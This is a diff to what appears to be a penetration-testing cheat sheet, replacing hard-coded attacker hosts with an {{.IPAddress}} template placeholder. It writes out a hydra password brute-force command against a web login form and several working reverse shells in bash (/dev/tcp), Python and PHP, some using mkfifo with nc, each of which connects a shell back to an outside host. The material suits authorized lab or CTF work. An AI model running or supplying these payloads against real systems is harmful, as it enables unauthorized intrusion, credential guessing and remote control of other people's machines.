@@ -62,7 +62,7 @@ Format:
 * `"login form":"POST form":"Failed Message"` see example below
 
 ```bash
-hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.60 -V https-post-form '/index.php:__csrf_magic=sid%3Ad09980e510f7e924131941c772682ffbc566d7b3%2C1650961765&usernamefld=^USER^&passwordfld=^PASS^&login=Login:Username or Password incorrect'
+hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt {{.IPAddress}} -V https-post-form '/index.php:__csrf_magic=sid%3Ad09980e510f7e924131941c772682ffbc566d7b3%2C1650961765&usernamefld=^USER^&passwordfld=^PASS^&login=Login:Username or Password incorrect'
 ```
 
 ## REVERSE SHELLS
@@ -70,7 +70,7 @@ hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k
 ### bash
 
 ```bash
-export RHOST=attacker.com
+export RHOST={{.IPAddress}}
 export RPORT=443
 bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
 ```
@@ -90,7 +90,7 @@ nc -l -p $LPORT -e /bin/sh
 ### python
 
 ```bash
-export RHOST=attacker.com
+export RHOST={{.IPAddress}}
 export RPORT=12345
 python -c 'import sys,socket,os,pty;s=socket.socket()
 s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
@@ -110,7 +110,7 @@ import subprocess
 import os
 
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.10.14.5",443))
+s.connect(("{{.IPAddress}}",443))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
@@ -121,14 +121,14 @@ short python:
 
 ```python
 import os
-os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 4444 >/tmp/f')
+os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{.IPAddress}} 4444 >/tmp/f')
 ```
 
 PHP
 
 ```php
 <?php
-system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 443 >/tmp/f');
+system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{.IPAddress}} 443 >/tmp/f');
 ?>
 ```
 
